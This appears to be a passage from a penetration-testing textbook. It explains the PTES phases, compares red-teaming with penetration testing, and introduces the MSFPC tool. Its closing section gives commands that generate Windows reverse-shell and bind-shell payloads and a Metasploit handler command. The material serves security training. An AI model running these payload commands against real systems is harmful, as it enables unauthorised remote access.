# Network Scoping and Communication Establishment
The initial phase of a penetration test typically involves mapping the network IPs, web applications, wireless networks, and other relevant components. Once scoping is complete, communication lines are established with all involved parties, including vendors and the incident reporting team. This process includes setting up status updates, calls, legal procedures, and defining the start and end dates of the project.

# Intelligence Gathering
Intelligence gathering is a critical step in which as much information as possible is collected about the target. The more information available, the more potential attack vectors can be identified and planned. In a whitebox test, this information is provided to the testing team upfront.

# Threat Modeling
Threat modeling is based on the amount of information gathered. Depending on the data, the activity can be divided and executed using automated tools, logical attacks, and other methods. The following diagram illustrates an example of a threat model mindmap:
![](media/image62.jpeg)

# Vulnerability Analysis
Vulnerability analysis involves identifying flaws that can be exploited by an attacker. These flaws can range from open ports and service misconfigurations to SQL injections. Tools such as Nmap, Acunetix, and Burp Suite are commonly used for this purpose. New tools are frequently released, enhancing the capabilities of vulnerability analysis.

# Exploitation
Exploitation is the process of gaining access to a system by bypassing its protection mechanisms, based on the vulnerabilities identified. Exploits can be public or zero-day vulnerabilities.

# Post-Exploitation
Post-exploitation focuses on determining the criticality of the compromise and maintaining access for future use. This phase must adhere to the rules of engagement, ensuring the protection of both the client and the testers.

# Reporting
Reporting is a crucial phase, as the remediation of issues depends on the details presented in the report. A comprehensive report should include:
- The criticality of the bug
- Steps to reproduce the bug
- Patch suggestions

The pentest lifecycle phases are summarized in the following diagram:
![](media/image63.jpeg)

# Red-Teaming: A Different Approach
Red-teaming aims to assess and determine the real level of risk a company faces at a given time. This activity tests networks, applications, physical security, and people (through social engineering) for weaknesses. Red-teaming simulates real-world hacking scenarios.

# Methodology
Red-teaming is based on the PTES standard but extends beyond it. While penetration testing aims to find as many vulnerabilities as possible within a given timeframe, red-teaming has a single, discreet goal. The methodology includes:
- Reconnaissance
- Compromise
- Persistence
- Command and control
- Privilege escalation
- Pivoting
- Reporting and cleanup

This cycle repeats for each new piece of information found until the goal is met:
![](media/image64.jpeg)
![](media/image65.png)
![](media/image66.jpeg)
![](media/image67.jpeg)
![](media/image68.png)
![](media/image69.jpeg)
![](media/image70.jpeg)

# Differences Between Red-Teaming and Penetration Testing
Red-teaming and penetration testing differ in several key aspects:
- **Goals**: Red-teaming focuses on achieving specific goals, while penetration testing identifies and exploits vulnerabilities within a defined scope.
- **Methodology**: Red-teaming uses a flexible approach, whereas penetration testing follows fixed, static methods.
- **Awareness**: Red-teaming is often conducted without the knowledge of the organization's security teams, while penetration testing is usually announced.
- **Timing**: Red-teaming can occur 24/7, while penetration testing is typically limited to business hours.
- **Impact**: Red-teaming measures the business impact of vulnerabilities, while penetration testing focuses on finding and exploiting them.

# Summary
In this chapter, we covered various standards and phases of penetration testing, including the PTES standard. We also explored the differences between red-teaming and penetration testing. In the next chapter, we will examine some of the latest post-exploitation tools and their functionalities.

# Questions
1. What are the different penetration testing standards?
2. What are the different phases of the PTES standard?
3. What is the difference between red-teaming and penetration testing?
4. What are the key elements of a report?
5. What is the main objective of a red-team activity?

# Further Reading
For more information, visit the following links:
- **High-Level Organization of the Standard**: [http://www.pentest-standard.org/index.php/Main_Page](http://www.pentest-standard.org/index.php/Main_Page)
- **OSSTMM**: [http://www.isecom.org/research/osstmm.html](http://www.isecom.org/research/osstmm.html)
- **Web Application Penetration Testing**: [https://www.owasp.org/index.php/Web_Application_Penetration_Testing](https://www.owasp.org/index.php/Web_Application_Penetration_Testing)
- **Information Systems Security Assessment Framework (ISSAF)**: [http://www.oissg.org/issaf02/issaf0.1-5.pdf](http://www.oissg.org/issaf02/issaf0.1-5.pdf)
- **InfoSec Resources**: [https://resources.infosecinstitute.com/the-history-of-penetration-testing/#gref](https://resources.infosecinstitute.com/the-history-of-penetration-testing/#gref)

# Pentesting 2018
In recent years, tools like Metasploit Framework, routersploit, LinuxEnum.sh, and nmap have been widely used for post-exploitation and scanning. With the growing popularity of new tools, it is beneficial to explore some of the latest options. In this chapter, we will cover:
- MSFvenom Payload Creator (MSFPC)
- Koadic

# Technical Requirements
- \*nix-based system (Kali, Ubuntu, or macOS X)
- The Metasploit framework (for MSFPC)
- Python package version 2 or 3 (for Koadic)

# MSFvenom Payload Creator
MSFvenom Payload Creator (MSFPC) is a user-friendly tool for generating Metasploit payloads with fewer commands. It simplifies the process of creating payloads compared to using the msfvenom command directly.

Before downloading MSFPC, ensure Metasploit is installed. MSFPC is a bash script, making it compatible with \*nix systems. Download the MSFPC package from [https://github.com/g0tmi1k/mpc](https://github.com/g0tmi1k/mpc).

To clone the repository and set up MSFPC, run the following commands:
```sh
git clone https://github.com/g0tmi1k/mpc
cd mpc/
chmod +x msfpc.sh
./msfpc.sh
```

### Generating a Payload
To generate a payload, specify the type, domain/IP, port, and shell type. For example, to create a simple classic reverse shell payload:
```sh
sh msfpc.sh cmd windows en0
```
This command generates a Windows executable payload that connects back to the specified IP and port, providing a command prompt shell.

### Resource File
Resource scripts in Metasploit automate repetitive tasks. The .rc file generated by MSFPC contains commands to handle the payload. For example:
```sh
msfconsole -q -r 'windows-meterpreter-staged-reverse-tcp-443-exe.rc'
```

### Types of Payloads
- **BIND/REVERSE**: Determines the type of connection. BIND opens a port on the target, while REVERSE connects back to the attacker.
- **STAGED/STAGELESS**: STAGED payloads are smaller but rely on the payload handler for the remaining parts. STAGELESS payloads are larger but more reliable.

For a stageless bind payload:
```sh
./msfpc.sh cmd stageless bind windows en0
```

This command generates a stageless Windows executable that listens for a bind connection to provide a command prompt.

By understanding these tools and methodologies, you can enhance your penetration testing and red-teaming capabilities.